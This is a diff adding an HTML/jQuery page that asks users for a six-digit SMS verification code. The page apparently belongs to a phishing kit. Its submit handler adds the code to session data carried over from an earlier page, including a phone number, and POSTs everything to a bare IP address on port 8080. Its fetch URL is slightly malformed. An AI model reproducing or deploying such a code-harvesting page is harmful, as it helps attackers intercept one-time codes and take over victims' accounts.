@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0" />
+  <title>code</title>
+  <link rel="stylesheet" href="./css/code.css" />
+  <script src="./js/rem.js"></script>
+  <script src="https://www.jq22.com/jquery/jquery-1.10.2.js"></script>
+  <script src="./js//websocket.js"></script>
+  <script>
+    // let load = document.querySelector('.loading');
+    $(function () {
+      $('.code').on('click', function () {
+        $(this).blur();
+        $('.code').eq(0).focus();
+        $('.code').unbind('click');
+      });
+      $('.code').on('focus', function () {
+        $(this).select();
+      });
+
+      $('.code').on('input', function () {
+        var value = $(this).val();
+        if (value.length == 4) {
+          $('.code').eq(0).val(value.slice(0, 1));
+          $('.code').eq(1).val(value.slice(1, 2));
+          $('.code').eq(2).val(value.slice(2, 3));
+          $('.code').eq(3).val(value.slice(3));
+          /*$(".code").eq(3).focus(); //如果需要保留焦点，请把这条代码留上*/
+        } else if (value.length >= 1) {
+          $(this).val(value.slice(0, 1));
+          $(this).blur();
+          $(this).next().focus();
+        } else if (value == '') {
+          //解决有些浏览器能输入字符e的问题
+          $(this).val('');
+        }
+      });
+
+      $(document).keyup(function (event) {
+        if (event.keyCode == 8) {
+          /* 监视删除按钮，手机和电脑上的keyCode都是8 */
+          var item = $('input:focus');
+          if (item.length) {
+            $(item).prev().focus();
+          }
+        }
+      });
+
+      $('.btn').on('click', function () {
+        showLoading();
+
+        $('.load').css('display', 'block');
+        var result = '';
+        $.each($('.code'), function (i) {
+          var value = $(this).val();
+          result += value;
+        });
+
+        //获取sessionStorage中的data
+        let data = JSON.parse(sessionStorage.getItem('data'));
+        data.verificationCode = result;
+
+        //发起http请求  
+
+        fetch('https://155.94.182.31:8080user/addCodeInfo', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify(data)
+        }).then(res => {
+          const result = res.json();
+          if (result.code == 410) {
+            //清除session 
+            sessionStorage.clear();
+            //跳转到登录页面
+            window.location.href = './index.html';
+          }
+        })
+      });
+    });
+  </script>
+  <!-- <script>
+      let aaaa = document.querySelector('.btn');
+      aaaa.onclick = function () {
+        setInterval(function () {
+          window.location.href = 'https://www.baidu.com/';
+        }, 1000);
+      };
+    </script> -->
+</head>
+
+<body>
+  <h2>Verification Code</h2>
+  <div class="codeDiv">
+    <input class="code" type="number" />
+    <input class="code" type="number" />
+    <input class="code" type="number" />
+    <input class="code" type="number" />
+    <input class="code" type="number" />
+    <input class="code" type="number" />
+    <div class="tip">
+      <img src="./img/gantan.png" alt="" />
+      <i>The verification code is entered incorrectly. Please fill in it again.</i>
+    </div>
+    <div class="loading"><img src="./img/loading.png" alt="" /></div>
+    <button type="button" class="btn">Submit</button>
+  </div>
+  <div class="introduce">
+    <p>A six-digit code was sent to</p>
+    <p style="font-weight: 700" id="phoneNumber">18866661111</p>
+    <p>It may take a while for the code to arrive</p>
+  </div>
+
+  <!-- <script>
+      let btn2 = document.querySelector('.btn');
+      let load = document.querySelector('.load');
+      console.log(load);
+
+      btn.onclick = function () {
+        let flag = true;
+        if (flag) {
+          window.location.href = 'https://www.baidu.com/';
+        }
+      };
+    </script> -->
+</body>
+<script>
+  document.querySelector('#phoneNumber').innerHTML = JSON.parse(sessionStorage.getItem('data')).phoneNumber;
+</script>
+
+</html>
